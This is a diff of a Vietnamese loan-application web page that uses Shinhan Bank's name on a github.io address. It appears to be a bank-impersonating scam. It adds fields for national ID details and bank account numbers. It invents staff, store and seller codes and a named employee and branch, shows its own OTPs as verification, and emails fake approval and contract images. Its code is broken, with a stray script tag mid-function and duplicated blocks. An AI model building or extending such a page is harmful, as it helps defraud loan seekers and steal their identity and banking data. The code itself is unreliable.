@@ -181,7 +181,7 @@
         }
         .image-section canvas {
             width: 100%;
-            max-width: 600px;
+            max-width: 360px;
             margin: 20px auto;
             display: block;
             border: 2px solid #e9ecef;
@@ -424,6 +424,14 @@
                     <input type="text" class="form-control" id="idNumber" placeholder="Nhập số CMND/CCCD" required>
                 </div>
                 <div class="mb-3">
+                    <label for="idIssueDate" class="form-label">Ngày Cấp CMND/CCCD</label>
+                    <input type="text" class="form-control" id="idIssueDate" placeholder="Nhập ngày cấp (DD/MM/YYYY)" required>
+                </div>
+                <div class="mb-3">
+                    <label for="idIssuePlace" class="form-label">Nơi Cấp CMND/CCCD</label>
+                    <input type="text" class="form-control" id="idIssuePlace" placeholder="Nhập nơi cấp" required>
+                </div>
+                <div class="mb-3">
                     <label for="address" class="form-label">Địa Chỉ Thường Trú</label>
                     <input type="text" class="form-control" id="address" placeholder="Nhập địa chỉ thường trú" required>
                 </div>
@@ -483,6 +491,25 @@
                         <option value="48">48 tháng</option>
                         <option value="60">60 tháng</option>
                     </select>
+                </div>
+                <div class="mb-3">
+                    <label for="loanPurpose" class="form-label">Mục Đích Vay</label>
+                    <select class="form-select" id="loanPurpose" required>
+                        <option value="" disabled selected>Chọn mục đích vay</option>
+                        <option value="Sửa chữa nhà">Sửa chữa nhà</option>
+                        <option value="Mua xe">Mua xe</option>
+                        <option value="Học tập">Học tập</option>
+                        <option value="Vay tiêu dùng">Vay tiêu dùng</option>
+                        <option value="Khác">Khác</option>
+                    </select>
+                </div>
+                <div class="mb-3">
+                    <label for="accountNumber" class="form-label">Số Tài Khoản Ngân Hàng</label>
+                    <input type="text" class="form-control" id="accountNumber" placeholder="Nhập số tài khoản ngân hàng" required pattern="[0-9]+">
+                </div>
+                <div class="mb-3">
+                    <label for="bankName" class="form-label">Tên Ngân Hàng</label>
+                    <input type="text" class="form-control" id="bankName" placeholder="Nhập tên ngân hàng" required>
                 </div>
                 <div class="mb-3">
                     <div class="terms-box">
@@ -783,18 +810,22 @@
         let formData = {
             contractImage: "https://vaytieudung.github.io/shinhanbank/assets/img/contract_image.png",
             disbursementImage: "https://vaytieudung.github.io/shinhanbank/assets/img/disbursement_image.png",
-            fallbackImage: "https://via.placeholder.com/600x800?text=Hinh+Anh+Mac+Dinh",
+            fallbackImage: "https://via.placeholder.com/360x509?text=Hinh+Anh+Mac+Dinh",
             fallbackProfileImage: "https://via.placeholder.com/150x150?text=Anh+Ho+So"
         };
 
         // Dữ liệu người đăng ký
         let userData = {};
 
+        // Quản lý mã ngẫu nhiên đã sử dụng
+        let usedCodes = JSON.parse(localStorage.getItem('usedCodes')) || new Set();
+
         // Hàm lưu dữ liệu vào localStorage
         function saveToLocalStorage(step) {
             try {
                 userData.currentStep = step;
                 localStorage.setItem('userData', JSON.stringify(userData));
+                localStorage.setItem('usedCodes', JSON.stringify([...usedCodes]));
             } catch (error) {
                 console.error("Lỗi lưu localStorage:", error);
                 showToast("Lỗi lưu dữ liệu. Vui lòng thử lại!", false);
@@ -824,6 +855,12 @@
         // Hàm chuyển bước
         function proceedToStep(currentStep, nextStep, progress) {
             try {
+                // Validate required fields before proceeding
+                const requiredFields = ['fullName', 'idNumber', 'idIssueDate', 'idIssuePlace', 'address', 'occupation', 'income', 'phoneNumber', 'email', 'loanAmount', 'loanTerm', 'loanPurpose', 'accountNumber', 'bankName', 'loanCode', 'registrationDate'];
+                if (nextStep > 1 && !requiredFields.every(field => userData[field] && userData[field] !== 'Không Cung Cấp')) {
+                    showToast("Dữ liệu không đầy đủ. Vui lòng kiểm tra lại!", false);
+                    return;
+                }
                 $(`#step${currentStep}`).addClass('hidden');
                 $(`#step${nextStep}`).removeClass('hidden');
                 $('#progressBar').css('width', `${progress}%`);
@@ -832,6 +869,8 @@
             } catch (error) {
                 console.error(`Lỗi chuyển từ bước ${currentStep} sang ${nextStep}:`, error);
                 showToast("Lỗi chuyển bước. Vui lòng thử lại!", false);
+                $(`#step${nextStep}`).addClass('hidden');
+                $(`#step${currentStep}`).removeClass('hidden');
             }
         }
 
@@ -852,6 +891,8 @@
                     } else {
                         $('#fullName').val(userData.fullName || '');
                         $('#idNumber').val(userData.idNumber || '');
+                        $('#idIssueDate').val(userData.idIssueDate || '');
+                        $('#idIssuePlace').val(userData.idIssuePlace || '');
                         $('#address').val(userData.address || '');
                         $('#occupation').val(userData.occupation || '');
                         $('#income').val(userData.income ? Number(userData.income).toLocaleString('vi-VN') : '');
@@ -859,6 +900,9 @@
                         $('#email').val(userData.email || '');
                         $('#loanAmount').val(userData.loanAmount || '');
                         $('#loanTerm').val(userData.loanTerm || '');
+                        $('#loanPurpose').val(userData.loanPurpose || '');
+                        $('#accountNumber').val(userData.accountNumber || '');
+                        $('#bankName').val(userData.bankName || '');
                         $('#termsAgree').prop('checked', userData.termsAgree || false);
                         if (userData.currentStep) {
                             proceedToStep(1, userData.currentStep, userData.currentStep * 10);
@@ -877,7 +921,7 @@
 
         // Hàm làm sạch dữ liệu
         function sanitizeInput(value) {
-            if (!value) return "KhongCungCap";
+            if (!value) return "";
             return String(value)
                 .normalize("NFD")
                 .replace(/[\u0300-\u036f]/g, "")
@@ -903,6 +947,21 @@
             }
         }
 
+        // Hàm tạo mã ngẫu nhiên với kiểm tra trùng lặp
+        function generateRandomCode() {
+            try {
+                let code;
+                do {
+                    code = Math.floor(100000 + Math.random() * 900000).toString();
+                } while (usedCodes.has(code));
+                usedCodes.add(code);
+                return code;
+            } catch (error) {
+                console.error("Lỗi tạo mã ngẫu nhiên:", error);
+                return "000000";
+            }
+        }
+
         // Hàm lấy ngày hiện tại
         function getCurrentDate() {
             try {
@@ -911,6 +970,19 @@
             } catch (error) {
                 console.error("Lỗi lấy ngày hiện tại:", error);
                 return "01/01/2025";
+            }
+        }
+
+        // Hàm tính lãi suất dựa trên số tiền vay
+        function calculateInterestRate(loanAmount) {
+            try {
+                const amount = parseInt(loanAmount);
+                if (amount <= 50000000) return "12%";
+                if (amount <= 200000000) return "11%";
+                return "10%";
+            } catch (error) {
+                console.error("Lỗi tính lãi suất:", error);
+                return "12%";
             }
         }
 
@@ -1055,9 +1127,17 @@
                     return;
                 }
                 let income = $('#income').val().replace(/[^0-9]/g, '') || '0';
+                let accountNumber = $('#accountNumber').val();
+                if (!/^\d+$/.test(accountNumber)) {
+                    showToast("Số tài khoản ngân hàng chỉ được chứa số!", false);
+                    $('#accountNumber').addClass('is-invalid');
+                    return;
+                }
                 userData = {
                     fullName: $('#fullName').val(),
                     idNumber: $('#idNumber').val(),
+                    idIssueDate: $('#idIssueDate').val(),
+                    idIssuePlace: $('#idIssuePlace').val(),
                     address: $('#address').val(),
                     occupation: $('#occupation').val(),
                     income: income,
@@ -1065,10 +1145,19 @@
                     email: $('#email').val(),
                     loanAmount: $('#loanAmount').val(),
                     loanTerm: $('#loanTerm').val(),
+                    loanPurpose: $('#loanPurpose').val(),
+                    accountNumber: accountNumber,
+                    bankName: $('#bankName').val(),
                     termsAgree: $('#termsAgree').is(':checked'),
                     loanCode: generateLoanCode(),
                     registrationDate: getCurrentDate(),
                     monthlyPayment: calculateMonthlyPayment($('#loanAmount').val(), $('#loanTerm').val()),
+                    interestRate: calculateInterestRate($('#loanAmount').val()),
+                    sellerCode: generateRandomCode(),
+                    storeCode: generateRandomCode(),
+                    staffCode: generateRandomCode(),
+                    staffName: "Nguyễn Thị Mỹ Duyên",
+                    branchName: "Chi nhánh Shinhanbank Đà Nẵng",
                     isRegistered: true
                 };
                 proceedToStep(1, 2, 20);
@@ -1149,7 +1238,10 @@
             try {
                 for (let key in params) {
                     if (params[key] === undefined || params[key] === null) {
-                        params[key] = "KhongCungCap";
+                        if (['loan_amount', 'loan_code', 'monthly_payment'].includes(key)) {
+                            throw new Error(`Trường ${key} không được để trống`);
+                        }
+                        params[key] = "";
                     }
                 }
                 return params;
@@ -1183,6 +1275,17 @@
             }
         }
 
+        // Hàm vẽ dấu checkmark
+        function drawCheckmark(ctx, x, y) {
+            ctx.beginPath();
+            ctx.moveTo(x, y);
+            ctx.lineTo(x + 5, y + 10);
+            ctx.lineTo(x + 15, y - 5);
+            ctx.strokeStyle = '#000000';
+            ctx.lineWidth = 2;
+            ctx.stroke();
+        }
+
         // Hàm hiển thị canvas với thông tin người dùng
         function renderCanvas(canvasId, imageUrl, userData) {
             try {
@@ -1193,257 +1296,526 @@
                 img.src = imageUrl;
 
                 img.onload = function() {
-                    // Thiết lập kích thước canvas theo hình ảnh
-                    canvas.width = img.width;
-                    canvas.height = img.height;
-                    ctx.drawImage(img, 0, 0);
+                    // Thiết lập kích thước canvas với độ phân giải cao
+                    canvas.width = 360 * 2;
+                    canvas.height = 509 * 2;
+                    ctx.scale(2, 2); // Tăng độ phân giải
+                    ctx.drawImage(img, 0, 0, 360, 509);
 
                     // Cấu hình font chữ và màu sắc
-                    ctx.font = '20px Roboto';
+                    ctx.font = '500 12px Roboto';
                     ctx.fillStyle = '#000000';
                     ctx.textAlign = 'left';
 
-                    // Tọa độ cơ bản cho các trường thông tin (giả định A4, 595x842px)
-                    const startX = 150; // Vị trí bắt đầu từ lề trái, ngay sau nhãn
-                    const baseY = 200; // Vị trí bắt đầu từ đầu trang
-                    const lineHeight = 40; // Khoảng cách giữa các dòng
+                    // Tọa độ cơ bản
+                    const startX = 40; // Lề trái, điều chỉnh để căn chỉnh tốt hơn
+                    const baseY = 40; // Điểm bắt đầu từ đầu trang
+                    const lineHeight = 18; // Khoảng cách giữa các dòng
 
-                    // Điều chỉnh vị trí cho hợp đồng (contractCanvas)
                     if (canvasId === 'contractCanvas') {
-                        ctx.fillText(userData.fullName || 'KhongCungCap', startX, baseY);
-                        ctx.fillText(userData.loanCode || 'KhongCungCap', startX, baseY + lineHeight);
-                        ctx.fillText(userData.registrationDate || getCurrentDate(), startX, baseY + 2 * lineHeight);
-                        ctx.fillText(`${formatNumber(userData.loanAmount) || '0'} VND`, startX, baseY + 3 * lineHeight);
-                        ctx.fillText(`${userData.loanTerm || '0'} tháng`, startX, baseY + 4 * lineHeight);
-                        ctx.fillText(`${userData.monthlyPayment || '0'} VND`, startX, baseY + 5 * lineHeight);
+                        let currentY = baseY;
+                        // Ngày nộp hồ sơ
+                        ctx.fillText(userData.registrationDate || '', startX, currentY);
+                        currentY += lineHeight;
+                        // Họ và tên
+                        ctx.fillText(userData.fullName || '', startX, currentY);
+                        currentY += lineHeight;
+                        // Số CMND/Hộ chiếu
+                        ctx.fillText(userData.idNumber || '', startX, currentY);
+                        currentY += lineHeight;
+                        // 4 số cuối thẻ tín dụng (bỏ qua)
+                        currentY += lineHeight;
+                        // Số điện thoại
+                        ctx.fillText(userData.phoneNumber || '', startX, currentY);
+                        currentY += lineHeight;
+                        // Email
+                        ctx.fillText(userData.email || '', startX, currentY);
+                        currentY += lineHeight;
+                        // Số tiền yêu cầu
+                        ctx.fillText(`${formatNumber(userData.loanAmount)} VND` || '0 VND', startX, currentY);
+                        currentY += lineHeight;
+                        // Mục tiêu khoản tạm ứng
+                        const purpose = userData.loanPurpose || 'Vay tiêu dùng';
+                        if (['Sửa chữa nhà', 'Mua xe', 'Học tập'].includes(purpose)) {
+                            if (purpose === 'Sửa chữa nhà') drawCheckmark(ctx, startX, currentY);
+                            if (purpose === 'Mua xe') drawCheckmark(ctx, startX + 50, currentY);
+                            if (purpose === 'Học tập') drawCheckmark(ctx, startX + 100, currentY);
+                            currentY += lineHeight;
+                        } else {
+                            ctx.fillText(`Khác: ${purpose}`, startX, currentY);
+                            currentY += lineHeight;
+                        }
+                        // Kì hạn
+                        const term = userData.loanTerm || '12';
+                        if (term === '12') drawCheckmark(ctx, startX, currentY);
+                        if (term === '24') drawCheckmark(ctx, startX + 50, currentY);
+                        if (term === '36') drawCheckmark(ctx, startX + 100, currentY);
+                        currentY += lineHeight;
+                        // Lãi suất
+                        ctx.fillText(userData.interestRate || '12%', startX, currentY);
+                        currentY += lineHeight;
+                        // Số hợp đồng
+                        ctx.fillText(userData.loanCode || '', startX, currentY);
+                        currentY += lineHeight;
+                        // Ngày đăng ký
+                        ctx.fillText(userData.registrationDate || '', startX, currentY);
+                        currentY += lineHeight;
+                        // Mã bên bán hàng
+                        ctx.fillText(userData.sellerCode || '000000', startX, currentY);
+                        currentY += lineHeight;
+                        // Mã cửa hàng
+                        ctx.fillText(userData.storeCode || '000000', startX, currentY);
+                        currentY += lineHeight;
+                        // Mã số nhân viên thực hiện
+                        ctx.fillText(userData.staffCode || '000000', startX, currentY);
+                        currentY += lineHeight;
+                        // Tên nhân viên thực hiện
+                        ctx.fillText(userData.staffName || 'Nguyễn Thị Mỹ Duyên', startX, currentY);
+                        currentY += lineHeight;
+                        // Chi nhánh
+                        ctx.fillText(userData.branchName || 'Chi nhánh Shinhanbank Đà Nẵng', startX, currentY);
+                        currentY += lineHeight;
+                        // Checkboxes xác nhận
+                        drawCheckmark(ctx, startX, currentY); // Email đúng
+                        currentY += lineHeight;
+                        drawCheckmark(ctx, startX, currentY); // Chủ thẻ
+                        currentY += lineHeight;
+                        drawCheckmark(ctx, startX, currentY); // Hồ sơ nộp
+                        currentY += lineHeight;
+                        drawCheckmark(ctx, startX, currentY); // Người hưởng lợi
+                        currentY += lineHeight;
+                        // Số tiền được phê duyệt
+                        ctx.fillText(`${formatNumber(userData.loanAmount)} VND` || '0 VND', startX, currentY);
+                        currentY += lineHeight;
+                        // Số ngày được phê duyệt
+                        ctx.fillText(userData.registrationDate || '', startX, currentY);
+
                         userData.contractImageUrl = canvas.toDataURL('image/png');
                         updatePreviewSection();
                         saveToLocalStorage(userData.currentStep || 8);
-                    }
-                    // Điều chỉnh vị trí cho điều kiện giải ngân (disbursementCanvas)
-                    else if (canvasId === 'disbursementCanvas') {
-                        ctx.fillText(userData.fullName || 'KhongCungCap', startX, baseY);
-                        ctx.fillText(userData.loanCode || 'KhongCungCap', startX, baseY + lineHeight);
-                        ctx.fillText(userData.registrationDate || getCurrentDate(), startX, baseY + 2 * lineHeight);
-                        ctx.fillText(`${formatNumber(userData.loanAmount) || '0'} VND`, startX, baseY + 3 * lineHeight);
-                        ctx.fillText(`${userData.loanTerm || '0'} tháng`, startX, baseY + 4 * lineHeight);
-                        ctx.fillText(`${userData.monthlyPayment || '0'} VND`, startX, baseY + 5 * lineHeight);
+                    } else if (canvasId === 'disbursementCanvas') {
+                        let currentY = baseY;
+                        // Số tài khoản
+                        ctx.fillText(userData.accountNumber || '', startX, currentY);
+                        currentY += lineHeight;
+                        // Họ và tên
+                        ctx.fillText(userData.fullName || '', startX, currentY);
+                        currentY += lineHeight;
+                        // Ngân hàng
+                        ctx.fillText(userData.bankName || '', startX, currentY);
+                        currentY += lineHeight;
+                        // Thông tin người đại diện hợp pháp
+                        ctx.fillText(userData.idNumber || '', startX, currentY);
+                        currentY += lineHeight;
+                        ctx.fillText(userData.idIssueDate || '', startX, currentY);
+                        currentY += lineHeight;
+                        ctx.fillText(userData.idIssuePlace || '', startX, currentY);
+
+                        userData.disbursementImageUrl = canvas.toDataURL('image/png');
+                        saveToLocalStorage(userData.currentStep || 9);
                     }
                 };
 
                 img.onerror = function() {
                     console.warn("Lỗi tải hình ảnh, sử dụng hình ảnh mặc định");
                     img.src = formData.fallbackImage;
-                    // Hiển thị thông tin trên hình ảnh mặc định
-                    canvas.width = 600;
-                    canvas.height = 800;
+                    canvas.width = 360 * 2;
+                    canvas.height = 509 * 2;
+                    ctx.scale(2, 2);
                     ctx.fillStyle = '#FFFFFF';
-                    ctx.fillRect(0, 0, canvas.width, canvas.height);
-                    ctx.font = '20px Roboto';
+                    ctx.fillRect(0, 0, 360, 509);
+                    ctx.font = '500 12px Roboto';
                     ctx.fillStyle = '#000000';
                     ctx.textAlign = 'left';
-                    const startX = 50;
-                    const baseY = 100;
-                    const lineHeight = 40;
-                    ctx.fillText(userData.fullName || 'KhongCungCap', startX, baseY);
-                    ctx.fillText(userData.loanCode || 'KhongCungCap', startX, baseY + lineHeight);
-                    ctx.fillText(userData.registrationDate || getCurrentDate(), startX, baseY + 2 * lineHeight);
-                    ctx.fillText(`${formatNumber(userData.loanAmount) || '0'} VND`, startX, baseY + 3 * lineHeight);
-                    ctx.fillText(`${userData.loanTerm || '0'} tháng`, startX, baseY + 4 * lineHeight);
-                    ctx.fillText(`${userData.monthlyPayment || '0'} VND`, startX, baseY + 5 * lineHeight);
+                    const startX = 40;
+                    const baseY = 40;
+                    const lineHeight = 18;
+
                     if (canvasId === 'contractCanvas') {
-                        userData.contractImageUrl = canvas.toDataURL('image/png');
-                        updatePreviewSection();
-                        saveToLocalStorage(userData.currentStep || 8);
-                    }
-                };
-            } catch (error) {
-                console.error("Lỗi hiển thị canvas:", error);
-                showToast("Không thể hiển thị tài liệu. Vui lòng thử lại!", false);
-                if (canvasId === 'contractCanvas') {
-                    userData.contractImageUrl = formData.fallbackImage;
-                    updatePreviewSection();
-                    saveToLocalStorage(userData.currentStep || 8);
-                }
-            }
+                        let currentY = baseY;
+                        ctx.fillText(userData.registrationDate || '', startX, currentY);
+                        currentY += lineHeight;
+                        ctx.fillText(userData.fullName || '', startX, currentY);
+                        currentY += lineHeight;
+                        ctx.fillText(userData.idNumber || '', startX, currentY);
+                        currentY += lineHeight;
+                        currentY += lineHeight; // Bỏ qua 4 số cuối thẻ tín dụng
+                        ctx.fillText(userData.phoneNumber || '', startX, currentY);
+                        currentY += lineHeight;
+                        ctx.fillText(userData.email || '', startX, currentY);
+                        currentY += lineHeight;
+                        ctx.fillText(`${formatNumber(userData.loanAmount)} VND` || '0 VND', startX, currentY);
+                        currentY += lineHeight;
+                        const purpose = userData.loanPurpose || 'Vay tiêu dùng';
+                        if (['Sửa chữa nhà', 'Mua xe', 'Học tập'].includes(purpose)) {
+                            if (purpose === 'Sửa chữa nhà') drawCheckmark(ctx, startX, currentY);
+                            if (purpose === 'Mua xe') drawCheckmark(ctx, startX + 50, currentY);
+                            if (purpose === 'Học tập') drawCheckmark(ctx, startX + 100, currentY);
+                            currentY += lineHeight;
+                        } else {
+                            ctx.fillText(`Khác: ${purpose}`, startX, currentY);
+                            currentY += lineHeight;
+                        }
+                        const term = userData.loanTerm || '12';
+                        if (term === '12') drawCheckmark(ctx, startX, currentY);
+                        if (term === '24') drawCheckmark(ctx, startX + 50, currentY);
+                        if (term === '36') drawCheckmark(ctx, startX + 100, currentY);
+                        currentY += lineHeight;
+                        ctx.fillText(userData.interestRate || '12%', startX, currentY);
+                        currentY += lineHeight;
+                        ctx.fillText(userData.loanCode || '', startX, currentY);
+                        currentY += lineHeight;
+                        ctx.fillText(userData.registrationDate || '', startX, currentY);
+                        currentY += lineHeight;
+                        ctx.fillText(userData.sellerCode || '000000', startX, currentY);
+                        currentY += lineHeight;
+                       <script>
+    // Tiếp tục từ đoạn code bị dừng
+    ctx.fillText(userData.storeCode || '000000', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.staffCode || '000000', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.staffName || 'Nguyễn Thị Mỹ Duyên', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.branchName || 'Chi nhánh Shinhanbank Đà Nẵng', startX, currentY);
+    currentY += lineHeight;
+    drawCheckmark(ctx, startX, currentY); // Email đúng
+    currentY += lineHeight;
+    drawCheckmark(ctx, startX, currentY); // Chủ thẻ
+    currentY += lineHeight;
+    drawCheckmark(ctx, startX, currentY); // Hồ sơ nộp
+    currentY += lineHeight;
+    drawCheckmark(ctx, startX, currentY); // Người hưởng lợi
+    currentY += lineHeight;
+    ctx.fillText(`${formatNumber(userData.loanAmount)} VND` || '0 VND', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.registrationDate || '', startX, currentY);
+
+    userData.contractImageUrl = canvas.toDataURL('image/png');
+    updatePreviewSection();
+    saveToLocalStorage(userData.currentStep || 8);
+} else if (canvasId === 'disbursementCanvas') {
+    let currentY = baseY;
+    ctx.fillText(userData.accountNumber || '', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.fullName || '', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.bankName || '', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.idNumber || '', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.idIssueDate || '', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.idIssuePlace || '', startX, currentY);
+
+    userData.disbursementImageUrl = canvas.toDataURL('image/png');
+    saveToLocalStorage(userData.currentStep || 9);
+}
+};
+
+img.onerror = function() {
+console.warn("Lỗi tải hình ảnh, sử dụng hình ảnh mặc định");
+img.src = formData.fallbackImage;
+canvas.width = 360 * 2;
+canvas.height = 509 * 2;
+ctx.scale(2, 2);
+ctx.fillStyle = '#FFFFFF';
+ctx.fillRect(0, 0, 360, 509);
+ctx.font = '500 12px Roboto';
+ctx.fillStyle = '#000000';
+ctx.textAlign = 'left';
+const startX = 40;
+const baseY = 40;
+const lineHeight = 18;
+
+if (canvasId === 'contractCanvas') {
+    let currentY = baseY;
+    ctx.fillText(userData.registrationDate || '', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.fullName || '', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.idNumber || '', startX, currentY);
+    currentY += lineHeight;
+    currentY += lineHeight; // Bỏ qua 4 số cuối thẻ tín dụng
+    ctx.fillText(userData.phoneNumber || '', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.email || '', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(`${formatNumber(userData.loanAmount)} VND` || '0 VND', startX, currentY);
+    currentY += lineHeight;
+    const purpose = userData.loanPurpose || 'Vay tiêu dùng';
+    if (['Sửa chữa nhà', 'Mua xe', 'Học tập'].includes(purpose)) {
+        if (purpose === 'Sửa chữa nhà') drawCheckmark(ctx, startX, currentY);
+        if (purpose === 'Mua xe') drawCheckmark(ctx, startX + 50, currentY);
+        if (purpose === 'Học tập') drawCheckmark(ctx, startX + 100, currentY);
+        currentY += lineHeight;
+    } else {
+        ctx.fillText(`Khác: ${purpose}`, startX, currentY);
+        currentY += lineHeight;
+    }
+    const term = userData.loanTerm || '12';
+    if (term === '12') drawCheckmark(ctx, startX, currentY);
+    if (term === '24') drawCheckmark(ctx, startX + 50, currentY);
+    if (term === '36') drawCheckmark(ctx, startX + 100, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.interestRate || '12%', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.loanCode || '', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.registrationDate || '', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.sellerCode || '000000', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.storeCode || '000000', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.staffCode || '000000', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.staffName || 'Nguyễn Thị Mỹ Duyên', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.branchName || 'Chi nhánh Shinhanbank Đà Nẵng', startX, currentY);
+    currentY += lineHeight;
+    drawCheckmark(ctx, startX, currentY); // Email đúng
+    currentY += lineHeight;
+    drawCheckmark(ctx, startX, currentY); // Chủ thẻ
+    currentY += lineHeight;
+    drawCheckmark(ctx, startX, currentY); // Hồ sơ nộp
+    currentY += lineHeight;
+    drawCheckmark(ctx, startX, currentY); // Người hưởng lợi
+    currentY += lineHeight;
+    ctx.fillText(`${formatNumber(userData.loanAmount)} VND` || '0 VND', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.registrationDate || '', startX, currentY);
+
+    userData.contractImageUrl = canvas.toDataURL('image/png');
+    updatePreviewSection();
+    saveToLocalStorage(userData.currentStep || 8);
+} else if (canvasId === 'disbursementCanvas') {
+    let currentY = baseY;
+    ctx.fillText(userData.accountNumber || '', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.fullName || '', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.bankName || '', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.idNumber || '', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.idIssueDate || '', startX, currentY);
+    currentY += lineHeight;
+    ctx.fillText(userData.idIssuePlace || '', startX, currentY);
+
+    userData.disbursementImageUrl = canvas.toDataURL('image/png');
+    saveToLocalStorage(userData.currentStep || 9);
+}
+};
+} catch (error) {
+console.error("Lỗi render canvas:", error);
+showToast("Lỗi hiển thị hợp đồng. Vui lòng thử lại!", false);
+}
+}
+
+// Hàm sao chép mã OTP ký hợp đồng
+function copySignOtp() {
+try {
+    const otp = $('#signOtpDisplay').text();
+    navigator.clipboard.writeText(otp).then(() => {
+        showToast("Đã sao chép mã OTP!", true);
+    }).catch(() => {
+        showToast("Lỗi khi sao chép mã OTP!", false);
+    });
+} catch (error) {
+    console.error("Lỗi sao chép OTP ký hợp đồng:", error);
+    showToast("Lỗi khi sao chép mã OTP!", false);
+}
+}
+
+// Bước 5: Xác nhận OTP
+$('#verifyOtpBtn').on('click', async function() {
+try {
+    const otpInput = $('#otp1').val() + $('#otp2').val() + $('#otp3').val() + $('#otp4').val() + $('#otp5').val() + $('#otp6').val();
+    if (otpInput === userData.otp) {
+        showToast("Xác nhận OTP thành công!", true);
+        proceedToStep(5, 6, 60);
+
+        // Gửi email thông báo duyệt
+        const emailParams = validateEmailParams({
+            full_name: userData.fullName,
+            email: userData.email,
+            loan_amount: formatNumber(userData.loanAmount),
+            loan_code: userData.loanCode,
+            monthly_payment: userData.monthlyPayment,
+            loan_term: userData.loanTerm,
+            interest_rate: userData.interestRate,
+            registration_date: userData.registrationDate
+        });
+
+        await sendEmail('service_9x4shzo', 'template_approval', emailParams);
+
+        // Hiển thị modal chúc mừng
+        $('#modalFullName').text(`Họ và Tên: ${userData.fullName}`);
+        $('#modalLoanAmount').text(`Số Tiền Vay: ${formatNumber(userData.loanAmount)} VND`);
+        $('#modalLoanCode').text(`Mã Hồ Sơ: ${userData.loanCode}`);
+        const successModal = new bootstrap.Modal(document.getElementById('successModal'));
+        successModal.show();
+
+        // Tự động chuyển sang bước 7 sau 5 giây
+        setTimeout(() => {
+            successModal.hide();
+            proceedToContract();
+        }, 5000);
+    } else {
+        showToast("Mã OTP không đúng. Vui lòng thử lại!", false);
+        $('.otp-digit').addClass('is-invalid');
+    }
+} catch (error) {
+    console.error("Lỗi xác nhận OTP:", error);
+    showToast("Lỗi xác nhận OTP. Vui lòng thử lại!", false);
+}
+});
+
+// Hàm chuyển sang bước xem hợp đồng
+function proceedToContract() {
+try {
+    $('#confirmationMessage').text(`Mã Hồ Sơ: ${userData.loanCode}`);
+    $('#confirmationEmail').text(userData.email);
+    proceedToStep(6, 7, 70);
+} catch (error) {
+    console.error("Lỗi chuyển sang bước hợp đồng:", error);
+    showToast("Lỗi chuyển bước. Vui lòng thử lại!", false);
+}
+}
+
+// Bước 7: Chuyển sang xem hợp đồng
+$('#proceedToContractBtn').on('click', function() {
+try {
+    proceedToStep(7, 8, 80);
+    renderCanvas('contractCanvas', formData.contractImage, userData);
+} catch (error) {
+    console.error("Lỗi chuyển sang bước 8:", error);
+    showToast("Lỗi hiển thị hợp đồng. Vui lòng thử lại!", false);
+}
+});
+
+// Bước 8: Chuyển sang ký hợp đồng
+$('#proceedToSignContractBtn').on('click', function() {
+try {
+    proceedToStep(8, '8-1', 85);
+    const signOtp = Math.floor(100000 + Math.random() * 900000);
+    $('#signOtpDisplay').text(signOtp);
+    userData.signOtp = signOtp.toString();
+    saveToLocalStorage('8-1');
+} catch (error) {
+    console.error("Lỗi chuyển sang bước 8-1:", error);
+    showToast("Lỗi khởi tạo OTP ký hợp đồng. Vui lòng thử lại!", false);
+}
+});
+
+// Bước 8.1: Xác nhận OTP ký hợp đồng
+$('#verifySignOtpBtn').on('click', async function() {
+try {
+    const signOtpInput = $('#signOtp1').val() + $('#signOtp2').val() + $('#signOtp3').val() + $('#signOtp4').val() + $('#signOtp5').val() + $('#signOtp6').val();
+    if (signOtpInput === userData.signOtp) {
+        showToast("Xác nhận OTP ký hợp đồng thành công!", true);
+        proceedToStep('8-1', 9, 90);
+
+        // Gửi email hợp đồng
+        const contractEmailParams = validateEmailParams({
+            full_name: userData.fullName,
+            email: userData.email,
+            loan_amount: formatNumber(userData.loanAmount),
+            loan_code: userData.loanCode,
+            contract_image: userData.contractImageUrl,
+            registration_date: userData.registrationDate
+        });
+
+        await sendEmail('service_9x4shzo', 'template_contract', contractEmailParams);
+
+        // Hiển thị điều kiện giải ngân
+        renderCanvas('disbursementCanvas', formData.disbursementImage, userData);
+
+        // Hiển thị modal chúc mừng ký hợp đồng
+        $('#celebrationMessage').text(`Hợp đồng của bạn đã được ký thành công! Mã Hồ Sơ: ${userData.loanCode}`);
+        const celebrationModal = new bootstrap.Modal(document.getElementById('celebrationModal'));
+        celebrationModal.show();
+
+        // Tự động đóng modal sau 5 giây
+        setTimeout(() => {
+            celebrationModal.hide();
+        }, 5000);
+    } else {
+        showToast("Mã OTP không đúng. Vui lòng thử lại!", false);
+        $('.otp-digit').addClass('is-invalid');
+    }
+} catch (error) {
+    console.error("Lỗi xác nhận OTP ký hợp đồng:", error);
+    showToast("Lỗi xác nhận OTP. Vui lòng thử lại!", false);
+}
+});
+
+// Bước 9: Chuyển sang bước hoàn tất
+$('#proceedToFinalStepBtn').on('click', async function() {
+try {
+    proceedToStep(9, 10, 100);
+
+    // Gửi email xác nhận giải ngân
+    const disbursementEmailParams = validateEmailParams({
+        full_name: userData.fullName,
+        email: userData.email,
+        loan_amount: formatNumber(userData.loanAmount),
+        loan_code: userData.loanCode,
